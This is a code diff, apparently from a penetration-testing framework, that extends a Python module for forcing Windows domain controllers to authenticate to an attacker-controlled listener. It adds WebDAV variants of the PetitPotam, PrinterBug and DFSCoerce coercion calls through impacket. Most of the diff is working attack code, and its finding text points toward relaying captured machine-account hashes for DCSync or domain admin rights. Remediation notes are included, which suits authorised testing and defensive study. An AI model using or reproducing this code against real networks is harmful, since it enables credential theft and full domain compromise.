@@ -229,9 +229,12 @@ class CoerceModule(BaseModule[CoerceParams, ModuleResult]):
         loop   = asyncio.get_running_loop()
         result = {"sent": False, "method": None, "error": None}
 
+        use_webdav = bool(kwargs.get("use_webdav") or kwargs.get("webdav") or method == "webdav")
+        webdav_port = int(kwargs.get("webdav_port", 80))
+
         # Method priority: auto tries PetitPotam first (no creds needed), then PrinterBug
         methods_to_try: list[str] = []
-        if method == "auto":
+        if method == "auto" or method == "webdav":
             methods_to_try = ["petitpotam", "printerbug", "dfscoerce"]
         else:
             methods_to_try = [method]
@@ -241,29 +244,29 @@ class CoerceModule(BaseModule[CoerceParams, ModuleResult]):
                 if m == "petitpotam":
                     sent = await loop.run_in_executor(
                         None,
-                        lambda: self._petitpotam_sync(dc, listener_ip, username, password, domain),
+                        lambda: self._petitpotam_sync(dc, listener_ip, username, password, domain, use_webdav=use_webdav, webdav_port=webdav_port),
                     )
                 elif m == "printerbug":
                     if not username:
                         continue
                     sent = await loop.run_in_executor(
                         None,
-                        lambda: self._printerbug_sync(dc, listener_ip, username, password, domain),
+                        lambda: self._printerbug_sync(dc, listener_ip, username, password, domain, use_webdav=use_webdav, webdav_port=webdav_port),
                     )
                 elif m == "dfscoerce":
                     if not username:
                         continue
                     sent = await loop.run_in_executor(
                         None,
-                        lambda: self._dfscoerce_sync(dc, listener_ip, username, password, domain),
+                        lambda: self._dfscoerce_sync(dc, listener_ip, username, password, domain, use_webdav=use_webdav, webdav_port=webdav_port),
                     )
                 else:
                     continue
 
                 if sent:
                     result["sent"]   = True
-                    result["method"] = m
-                    logger.info("coerce_sent", target=dc, method=m, listener=listener_ip)
+                    result["method"] = f"{m}_webdav" if use_webdav else m
+                    logger.info("coerce_sent", target=dc, method=result["method"], listener=listener_ip)
                     break
 
             except Exception as exc:
@@ -272,26 +275,33 @@ class CoerceModule(BaseModule[CoerceParams, ModuleResult]):
                 continue
 
         if result["sent"]:
+            evidence_data = {
+                "target":          dc,
+                "listener":        listener_ip,
+                "method":          result["method"],
+                "next_step":       "Check lateral.smb_relay output for captured NTLM hash",
+            }
+            if use_webdav:
+                evidence_data["webdav_coercion"] = True
+                evidence_data["webdav_port"] = webdav_port
+                evidence_data["smb_signing_bypass"] = True
+
             self.finding(
-                title       = f"Authentication Coercion Sent to {dc} via {result['method']}",
+                title       = f"Authentication Coercion Sent to {dc} via {result['method']}" + (" (WebDAV / SMB Signing Bypass)" if use_webdav else ""),
                 description = (
                     f"Successfully forced {dc} to authenticate to {listener_ip} "
-                    f"via {result['method']}. "
+                    f"via {result['method']}" + (" over HTTP/WebDAV (bypassing SMB signing restrictions)." if use_webdav else ".") + " "
                     "If lateral.smb_relay is listening, the machine account NTLM hash "
                     "should now be captured. Relay to LDAP for DCSync rights or SMB for DA."
                 ),
                 severity    = Severity.CRITICAL,
                 mitre_technique = "T1187",
                 mitre_tactic    = "Credential Access",
-                evidence = {
-                    "target":          dc,
-                    "listener":        listener_ip,
-                    "method":          result["method"],
-                    "next_step":       "Check lateral.smb_relay output for captured NTLM hash",
-                },
+                evidence = evidence_data,
                 remediation = (
                     "Patch MS-EFSRPC (KB5005413 / disabling EFS on DCs). "
                     "Disable Print Spooler service on DCs (PrinterBug mitigation). "
+                    "Disable WebClient service on clients and servers (Set-Service WebClient -StartupType Disabled). "
                     "Enable Protected Users security group for all DC accounts."
                 ),
                 host = dc, confidence = 0.95,
@@ -315,12 +325,14 @@ class CoerceModule(BaseModule[CoerceParams, ModuleResult]):
             "target": dc, "listener": listener_ip,
             "method": result["method"], "sent": result["sent"],
             "error": result.get("error"),
+            "webdav_coercion_used": use_webdav and result["sent"],
         }
         raw["coercion_sent"] = raw.get("sent", False)  # OUTPUTS key
         return self._findings[:], raw
 
     def _petitpotam_sync(self, dc: str, listener_ip: str,
-                          username: str, password: str, domain: str) -> bool:
+                          username: str, password: str, domain: str,
+                          use_webdav: bool = False, webdav_port: int = 80) -> bool:
         """MS-EFSRPC: EfsRpcOpenFileRaw - works unauthenticated on unpatched systems."""
         try:
             from impacket.dcerpc.v5 import transport, efsrpc
@@ -338,8 +350,12 @@ class CoerceModule(BaseModule[CoerceParams, ModuleResult]):
             dce.connect()
             dce.bind(efsrpc.MSRPC_UUID_EFSR)
 
-            # Coerce DC to authenticate to listener via UNC path
-            unc_path = f"\\\\{listener_ip}\\share\\file"
+            # Coerce DC to authenticate to listener via UNC path (standard or WebDAV)
+            if use_webdav:
+                unc_path = f"\\\\{listener_ip}@{webdav_port}\\share\\file"
+            else:
+                unc_path = f"\\\\{listener_ip}\\share\\file"
+
             try:
                 efsrpc.hEfsRpcOpenFileRaw(dce, unc_path, 0)
             except DCERPCException:
@@ -355,7 +371,8 @@ class CoerceModule(BaseModule[CoerceParams, ModuleResult]):
             return False
 
     def _printerbug_sync(self, dc: str, listener_ip: str,
-                          username: str, password: str, domain: str) -> bool:
+                          username: str, password: str, domain: str,
+                          use_webdav: bool = False, webdav_port: int = 80) -> bool:
         """MS-RPRN: RpcRemoteFindFirstPrinterChangeNotification - needs domain creds."""
         try:
             from impacket.dcerpc.v5 import transport, rprn
@@ -376,10 +393,11 @@ class CoerceModule(BaseModule[CoerceParams, ModuleResult]):
             resp = rprn.hRpcOpenPrinter(dce, f"\\\\{dc}")
             handle = resp["pHandle"]
 
-            # Trigger auth to listener
+            # Trigger auth to listener (with WebDAV support)
+            target_unc = f"\\\\{listener_ip}@{webdav_port}" if use_webdav else f"\\\\{listener_ip}"
             try:
                 rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(
-                    dce, handle, 0x00000100, 0, f"\\\\{listener_ip}", NULL
+                    dce, handle, 0x00000100, 0, target_unc, NULL
                 )
             except DCERPCException:
                 pass   # expected error - trigger happened
@@ -395,7 +413,8 @@ class CoerceModule(BaseModule[CoerceParams, ModuleResult]):
             return False
 
     def _dfscoerce_sync(self, dc: str, listener_ip: str,
-                         username: str, password: str, domain: str) -> bool:
+                         username: str, password: str, domain: str,
+                         use_webdav: bool = False, webdav_port: int = 80) -> bool:
         """MS-DFSNM: NetrDfsAddStdRoot - needs domain creds."""
         try:
             from impacket.dcerpc.v5 import transport, dfsnm
@@ -411,8 +430,9 @@ class CoerceModule(BaseModule[CoerceParams, ModuleResult]):
             dce.connect()
             dce.bind(dfsnm.MSRPC_UUID_DFSNM)
 
+            unc_path = f"\\\\{listener_ip}@{webdav_port}\\share" if use_webdav else f"\\\\{listener_ip}\\share"
             try:
-                dfsnm.hNetrDfsAddStdRoot(dce, f"\\\\{listener_ip}\\share", "share", 0)
+                dfsnm.hNetrDfsAddStdRoot(dce, unc_path, "share", 0)
             except DCERPCException:
                 pass   # expected - trigger happened
             finally:
